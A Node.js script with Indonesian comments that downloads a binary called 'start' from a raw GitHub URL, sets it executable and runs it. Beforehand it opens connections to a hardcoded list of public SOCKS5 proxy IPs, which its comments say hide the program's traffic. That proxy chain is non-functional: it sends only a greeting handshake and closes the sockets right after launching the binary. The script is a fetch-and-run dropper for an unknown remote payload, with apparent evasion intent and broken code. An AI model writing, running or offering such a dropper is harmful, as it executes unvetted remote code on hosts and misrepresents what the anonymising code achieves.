const https = require("https");
const fs = require("fs");
const net = require("net");
const { exec } = require("child_process");
const path = require("path");

// Fungsi untuk mengunduh file dari URL
function downloadFile(url, outputFilePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputFilePath);
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        return reject(new Error(`Gagal mengunduh file: ${response.statusCode}`));
      }
      response.pipe(file);
      file.on("finish", () => {
        file.close(resolve);
      });
    }).on("error", (err) => {
      fs.unlink(outputFilePath, () => reject(err));
    });
  });
}

// Mengatur izin eksekusi file
function setExecutable(filePath) {
  return new Promise((resolve, reject) => {
    fs.chmod(filePath, 0o755, (err) => {
      if (err) reject(err);
      else resolve();
    });
  });
}

// Fungsi untuk mengacak array (agar proxy dipilih secara acak)
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

// Membuat koneksi proxy SOCKS5 dengan retry jika mati di tengah jalan
async function createChainedSocks5Proxies(proxyList) {
  while (true) {
    shuffleArray(proxyList); // Acak urutan proxy setiap percobaan
    let selectedProxies = proxyList.slice(0, 4); // Pilih 4 proxy secara acak

    let sockets = [];

    try {
      for (let i = 0; i < selectedProxies.length; i++) {
        const [proxyHost, proxyPort] = selectedProxies[i].split(":");

        console.log(`🔗 Menghubungkan ke proxy ${proxyHost}:${proxyPort}...`);
        const socket = await new Promise((resolve, reject) => {
          const sock = net.connect(proxyPort, proxyHost, () => {
            // Kirim handshake SOCKS5
            sock.write(Buffer.from([0x05, 0x01, 0x00])); // SOCKS5, 1 metode (no auth)
          });

          sock.once("data", (data) => {
            if (data.length < 2 || data[0] !== 0x05 || data[1] !== 0x00) {
              reject(new Error(`Handshake SOCKS5 gagal di ${proxyHost}:${proxyPort}`));
            } else {
              console.log(`✅ Handshake sukses: ${proxyHost}:${proxyPort}`);
              resolve(sock);
            }
          });

          sock.on("error", (err) => reject(err));
          sock.on("close", () => {
            console.error(`❌ Proxy ${proxyHost}:${proxyPort} mati! Mencari pengganti...`);
            replaceFailedProxy(sockets, proxyList); // Jika proxy mati, ganti dengan yang lain
          });
        });

        sockets.push(socket);
      }

      console.log("✅ Semua proxy dalam rantai terhubung!");
      return sockets; // Jika sukses, kembalikan rantai socket

    } catch (err) {
      console.error(`❌ Kesalahan koneksi proxy: ${err.message}`);
      sockets.forEach((sock) => sock.end()); // Tutup semua socket yang sudah terbuka
      console.log("🔄 Mencoba proxy lain...");
    }
  }
}

// Fungsi untuk mengganti proxy yang mati dengan yang baru
async function replaceFailedProxy(sockets, proxyList) {
  shuffleArray(proxyList);
  for (let proxy of proxyList) {
    const [proxyHost, proxyPort] = proxy.split(":");

    try {
      console.log(`🔄 Mencoba proxy baru: ${proxyHost}:${proxyPort}`);
      const newSocket = await new Promise((resolve, reject) => {
        const sock = net.connect(proxyPort, proxyHost, () => {
          sock.write(Buffer.from([0x05, 0x01, 0x00]));
        });

        sock.once("data", (data) => {
          if (data.length < 2 || data[0] !== 0x05 || data[1] !== 0x00) {
            reject(new Error(`Handshake SOCKS5 gagal di ${proxyHost}:${proxyPort}`));
          } else {
            console.log(`✅ Proxy baru aktif: ${proxyHost}:${proxyPort}`);
            resolve(sock);
          }
        });

        sock.on("error", (err) => reject(err));
      });

      sockets.push(newSocket);
      return;
    } catch (err) {
      console.error(`❌ Gagal menyambung ke proxy baru: ${err.message}`);
    }
  }
  console.log("❌ Semua proxy mati. Mengulang proses dari awal...");
  await createChainedSocks5Proxies(proxyList);
}

// Menjalankan program dengan proxy (selalu pakai proxy, tidak pernah berjalan tanpa proxy)
async function runSoftwareWithProxy(softwarePath, proxyList) {
  console.log("🔍 Membangun rantai koneksi proxy...");

  while (true) {
    try {
      const proxySockets = await createChainedSocks5Proxies(proxyList);
      console.log(`🚀 Menjalankan ${softwarePath} dengan rantai proxy.`);

      exec(softwarePath, { stdio: "inherit" }, (error, stdout, stderr) => {
        if (error) {
          console.error(`❌ Kesalahan saat menjalankan: ${error.message}`);
        } else {
          console.log(`📝 Output: ${stdout}`);
          console.error(`⚠️ Error: ${stderr}`);
        }
      });

      proxySockets.forEach((sock) => sock.end());
      return; // Jika berhasil menjalankan, keluar dari loop
    } catch (err) {
      console.error(`❌ Gagal membentuk rantai proxy: ${err.message}`);
      console.log("🔄 Mencoba lagi dengan proxy baru...");
    }
  }
}

// Daftar proxy SOCKS5
const proxyList = [
  "192.111.129.145:16894",
  "184.178.172.28:15294",
  "192.111.129.150:4145",
  "72.195.114.169:4145",
  "174.75.211.222:4145",
  "72.195.34.41:4145",
  "174.77.111.197:4145",
  "184.181.217.210:4145",
  "192.252.215.5:16137",
  "24.249.199.4:4145",
  "192.111.139.165:4145",
  "174.64.199.79:4145",
  "184.178.172.5:15303",
  "198.8.94.170:4145",
  "72.195.34.42:4145",
  "192.111.137.35:4145",
  "184.178.172.18:15280",
];

// URL file yang akan diunduh
const filesToDownload = [
  { url: "https://raw.githubusercontent.com/wpbystx/hanslakai/refs/heads/main/start", outputPath: "./start" },
];

// Main function
(async function main() {
  try {
    console.log("📥 Mengunduh dan mengatur file...");
    for (const file of filesToDownload) {
      await downloadFile(file.url, file.outputPath);
      await setExecutable(file.outputPath);
    }
    console.log("✅ Setup selesai.");

    const softwarePath = path.resolve("./start");
    if (!fs.existsSync(softwarePath)) {
      throw new Error("❌ File `start` tidak ditemukan.");
    }

    // Jalankan software dengan proxy chain (terus mencoba sampai berhasil)
    await runSoftwareWithProxy(softwarePath, proxyList);
  } catch (err) {
    console.error(`❌ Kesalahan: ${err.message}`);
  }
})();
